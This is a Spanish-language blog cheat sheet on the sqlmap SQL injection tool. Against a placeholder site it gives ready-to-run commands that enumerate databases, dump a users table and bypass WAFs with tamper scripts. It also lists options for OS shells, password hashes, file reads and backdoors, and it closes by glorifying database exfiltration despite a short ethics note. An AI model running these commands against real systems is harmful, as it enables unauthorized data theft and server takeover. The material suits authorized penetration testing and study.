
---
title: "sqlmap: El maestro de las inyecciones SQL"
author: "l1ttl3bugc4t"
date: "2025-05-12"
tags: [sqlmap, SQL Injection, Pentesting, Red Team, Seguridad Web, Herramientas]
categories: [Cuaderno, Red Team & Chill, CyberChallenges]
---

**sqlmap** es una herramienta de código abierto que automatiza el proceso de detección y explotación de **SQL Injection** 💉📜  
Ideal para pruebas rápidas y potentes sobre aplicaciones web vulnerables.

---

## ⚙️ ¿Qué es sqlmap?

Es una herramienta escrita en Python que permite detectar y explotar inyecciones SQL en parámetros web.  
Además, puede hacer desde extracción de bases de datos hasta obtener shells interactivas en el servidor 😼

---

## 🚀 Comandos básicos

```bash
sqlmap -u "http://victima.com/producto.php?id=1" --dbs
```
Descubre las bases de datos disponibles.

```bash
sqlmap -u "http://victima.com/item.php?id=1" -D tienda -T usuarios --dump
```
Extrae datos de una tabla específica.

```bash
sqlmap -r request.txt --level 5 --risk 3 --batch
```
Usa un archivo de petición interceptada (por ejemplo, desde Burp).

---

## 🧪 Opciones útiles

| Opción | Descripción |
|--------|-------------|
| `--dbs` | Enumera las bases de datos |
| `--tables` | Enumera las tablas de una base de datos |
| `--columns` | Muestra las columnas de una tabla |
| `--dump` | Extrae el contenido |
| `--os-shell` | Intenta obtener una shell del sistema operativo |
| `--passwords` | Obtiene hashes de contraseñas |
| `--level` y `--risk` | Ajustan el grado de pruebas y agresividad |
| `--batch` | Ejecuta sin preguntar confirmaciones |
| `--tamper` | Usa scripts para evadir WAFs |

---

## 🔒 Bypass de WAFs

Puedes usar técnicas evasivas:

```bash
sqlmap -u "http://victima.com" --tamper=space2comment --level=5 --risk=3
```

Scripts comunes:

- `space2comment`
- `charunicodeencode`
- `between`
- `randomcase`

---

## 📁 Tip: usar archivo `.txt` de Burp

Intercepta una petición con Burp → guarda → y úsala con:

```bash
sqlmap -r request.txt --dbs
```

¡Perfecto para inyecciones en métodos POST, headers o JSON!

---

## 🎯 Casos de uso avanzados

- Detectar SQLi en múltiples URLs con `--crawl`
- Automatizar bruteforce de parámetros `--forms`, `--crawl=3`
- Obtener archivos con `--file-read`
- Crear backdoors: `--os-shell`, `--os-pwn`

---

## 🛡️ Ética en uso

sqlmap es muy poderosa. Úsala solo con **permiso expreso**.  
Es una herramienta para **defensa ofensiva**, no para explotación sin ética.

---

## ✨ Conclusión

**sqlmap** es como un bisturí para vulnerabilidades SQL: preciso, rápido y letal si se usa bien.  
Perfecto para l@s que quieren exfiltrar bases de datos con estilo 😈💜

> _"Una URL, una inyección… y toda la base de datos en tu terminal."_ — **l1ttl3bugc4t**

---
